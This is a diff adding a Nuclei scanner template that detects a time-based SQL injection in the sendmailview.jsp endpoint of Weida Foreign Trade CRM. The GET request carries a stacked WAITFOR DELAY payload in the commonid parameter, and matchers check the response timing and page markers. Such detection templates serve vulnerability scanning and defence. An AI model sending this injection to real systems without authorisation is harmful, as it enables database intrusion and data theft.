@@ -1,0 +1,32 @@
+id: poc-yaml-weidasoft-sendmailview-sqli
+info:
+  name: Weida Foreign Trade CRM sendmailview SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The sendmailview functionality in Weida Foreign Trade CRM has a SQL Injection vulnerability. This allows an attacker to execute arbitrary SQL queries, potentially leading to data exfiltration or system compromise.
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /wap/common/sendmailview.jsp?commonid=1%27;WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "window.parent.open"
+          - "id=\"sendmailViewPage\""
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration > to_number(t2)"
+          - "duration < to_number(t3)"
